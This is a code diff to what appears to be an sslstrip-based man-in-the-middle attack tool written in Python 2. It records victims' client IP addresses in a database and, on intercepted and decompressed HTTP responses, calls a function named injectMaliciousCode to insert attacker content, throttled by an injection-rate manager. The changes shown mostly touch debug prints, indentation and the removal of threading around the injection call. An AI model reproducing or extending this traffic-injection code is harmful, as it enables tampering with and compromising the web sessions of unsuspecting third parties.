@@ -71,16 +71,17 @@ class ServerConnection(HTTPClient):
 
             #Determine if injection is true
         self.injection = module.active
+        #print "using sslstrip"
 
-	#Injection Manager (uses settins to determine injection rate)
+	   #Injection Manager (uses settins to determine injection rate)
     def injectManager(self, clientip):
         settings = setup.objects.get(id = "1")
-		#Set Injection Bit
+		   #Set Injection Bit
         print "Injection Sent to: " + clientip
         print "Pausing Injection for " + settings.injectrate + " secs..."
         iptrack.objects.filter(address = clientip).update(injected = "1")
 
-		#Reset inject	
+		   #Reset inject	
         time.sleep(int(settings.injectrate))
         print "Resuming Injection"
         iptrack.objects.filter(address = clientip).update(injected = "0")
@@ -99,6 +100,7 @@ class ServerConnection(HTTPClient):
         #data += str(inject)
         for j in inject:
            data += str(j)
+        #print data
         return data
     ############################################
 
@@ -186,7 +188,7 @@ class ServerConnection(HTTPClient):
             logging.debug("Decompressing content...")
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
            
-           
+        #print data           
         ####################################    
             #Data manipulation determination
             #0sm0s1z
@@ -194,30 +196,27 @@ class ServerConnection(HTTPClient):
         with open(str(os.path.dirname(os.path.abspath(__file__))) + '/clientip', 'r') as file:
             clientip = file.readlines()    
             
+        print clientip, "is using sslstrip"
+        
         iptrack.objects.filter(id = "1").update(address = clientip[0])    
-            
+        
             #Check for Existing IP Address
         try:
            check = iptrack.objects.exclude(id = "1").get(address = clientip[0])
+
                #Check for uninjected IP Address   
            if check.injected == "0":
-              if len(self.injection) > 2:
-		  #Execute Injection Rate Manager and Injection as Threads                  
-		  #inject = threading.Thread(target = self.injectMaliciousCode, args = (data, clientip[0]))
-		  manager = threading.Thread(target = self.injectManager, args = (clientip))
-		  #data = inject.start()
-		  manager.start()
-		  data = self.injectMaliciousCode(data, clientip[0])
-	
+              if len(self.injection) > 2: 
+                  data = self.injectMaliciousCode(data, clientip[0])
+                    
         except:
             newip = iptrack(address = clientip[0], injected = "0")
             newip.save()
             print "New Client Detected! %s" % clientip[0]
             if len(self.injection) > 2: 
-               data = self.injectMaliciousCode(data, clientip[0])
-
-            
-            
+               data = self.injectMaliciousCode(data, clientip[0])            
+               #print data     
+                
         
         ####################################       
             
